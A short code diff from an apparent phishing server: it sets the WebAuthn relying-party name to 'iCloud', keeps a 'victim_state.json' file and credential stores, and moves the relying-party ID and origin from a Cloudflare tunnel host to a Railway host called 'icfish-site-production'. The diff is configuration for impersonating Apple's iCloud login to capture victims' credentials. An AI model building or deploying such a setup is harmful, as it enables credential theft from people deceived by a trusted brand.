@@ -29,9 +29,9 @@ STATE_FILE = BASE_DIR / 'victim_state.json'
 registered_credentials = {}
 challenge_store = {}
 
-RP_ID = "realize-mail-consequence-listing.trycloudflare.com"
+RP_ID = "icfish-site-production.up.railway.app"
 RP_NAME = "iCloud"
-ORIGIN = "https://realize-mail-consequence-listing.trycloudflare.com"
+ORIGIN = "https://icfish-site-production.up.railway.app"
 
 def b64encode(data):
     return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')
